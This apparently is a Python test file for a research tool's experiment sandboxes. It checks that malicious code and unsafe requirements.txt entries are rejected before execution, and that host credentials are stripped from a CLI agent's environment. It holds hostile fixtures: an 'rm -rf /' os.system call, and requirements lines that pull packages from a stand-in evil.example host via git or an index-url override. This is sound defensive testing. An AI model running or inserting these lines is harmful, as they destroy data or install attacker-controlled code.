"""S0-1 (tasks/arch_hardening_plan.md): malicious code must be rejected at
the sandbox boundary (ExperimentSandbox / DockerSandbox), before any
subprocess spawns — not left to the caller to remember to validate."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

from berb.config import DockerSandboxConfig
from berb.experiment.docker_sandbox import DockerSandbox
from berb.experiment.sandbox import ExperimentSandbox, SandboxConfig

_MALICIOUS = "import os\nos.system('rm -rf /')"
_SAFE = "print('hello')"


class TestExperimentSandboxGate:
    @patch("berb.experiment.sandbox.subprocess.run")
    def test_run_rejects_malicious_code_without_spawning(self, mock_run, tmp_path: Path):
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_run_allows_safe_code(self, mock_run, tmp_path: Path):
        from subprocess import CompletedProcess

        mock_run.return_value = CompletedProcess(args=[], returncode=0, stdout="ok\n", stderr="")
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_SAFE)

        assert result.returncode == 0
        mock_run.assert_called_once()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_run_project_rejects_malicious_file_without_spawning(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_MALICIOUS, encoding="utf-8")

        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()


class TestCliAgentEnvStripping:
    """S0-8 (tasks/arch_hardening_plan.md): the CLI-agent subprocess must
    not inherit host credentials — this is check_code_security's own
    acceptance criterion, never written when S0-8 shipped."""

    def test_secret_env_var_absent_from_cli_agent_child_env(self, tmp_path: Path, monkeypatch):
        from unittest.mock import MagicMock

        from berb.experiment.code_agent import ClaudeCodeAgent

        monkeypatch.setenv("MY_SERVICE_API_KEY", "sk-super-secret-value")
        monkeypatch.setenv("SAFE_UNRELATED_VAR", "fine")

        captured_env: dict[str, str] = {}

        def _fake_popen(cmd, **kwargs):
            captured_env.update(kwargs.get("env") or {})
            proc = MagicMock()
            proc.communicate.return_value = (b"ok", b"")
            proc.returncode = 0
            return proc

        with patch("berb.experiment.code_agent.subprocess.Popen", side_effect=_fake_popen):
            agent = ClaudeCodeAgent(binary_path="claude")
            agent._run_subprocess(["claude", "-p", "hi"], tmp_path / "work", timeout_sec=5)

        assert "MY_SERVICE_API_KEY" not in captured_env
        assert (
            captured_env.get("SAFE_UNRELATED_VAR") is None
        )  # not in the PATH/HOME allowlist either


class TestRejectedReasonField:
    """S-6 (tasks/hardening_plan_2026-08-13.md): a security rejection sets
    the typed `rejected_reason` sentinel, not just returncode==-1, so
    callers can distinguish it from a crashed experiment."""

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_run_sets_rejected_reason(self, mock_run, tmp_path: Path):
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.rejected_reason is not None
        assert "security validation" in result.rejected_reason.lower()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_safe_run_leaves_rejected_reason_none(
        self, mock_run, tmp_path: Path
    ):
        from subprocess import CompletedProcess

        mock_run.return_value = CompletedProcess(args=[], returncode=0, stdout="ok\n", stderr="")
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_SAFE)

        assert result.rejected_reason is None

    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_docker_sandbox_run_sets_rejected_reason(self, mock_run, tmp_path: Path):
        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.rejected_reason is not None


class TestRequirementsTxtGate:
    """S-3 (tasks/hardening_plan_2026-08-13.md): requirements.txt is a
    separate code-execution channel (pip runs arbitrary setup.py, honors
    VCS/URL/editable installs) the .py scan never covers on its own."""

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_rejects_vcs_install(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_SAFE, encoding="utf-8")
        (project_dir / "requirements.txt").write_text(
            "-e git+https://evil.example/malicious-pkg\n", encoding="utf-8"
        )

        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "requirements.txt" in result.stderr.lower()
        mock_run.assert_not_called()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_allows_plain_requirements(self, mock_run, tmp_path: Path):
        from subprocess import CompletedProcess

        mock_run.return_value = CompletedProcess(args=[], returncode=0, stdout="ok\n", stderr="")
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_SAFE, encoding="utf-8")
        (project_dir / "requirements.txt").write_text("numpy==1.26.4\n", encoding="utf-8")

        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == 0
        mock_run.assert_called_once()

    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_docker_sandbox_rejects_index_url_override(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_SAFE, encoding="utf-8")
        (project_dir / "requirements.txt").write_text(
            "--index-url https://evil.example/simple\nnumpy\n", encoding="utf-8"
        )

        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "requirements.txt" in result.stderr.lower()
        mock_run.assert_not_called()


class TestDockerSandboxGate:
    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_run_rejects_malicious_code_without_spawning(self, mock_run, tmp_path: Path):
        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()

    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_run_project_rejects_malicious_file_without_spawning(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_MALICIOUS, encoding="utf-8")

        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()
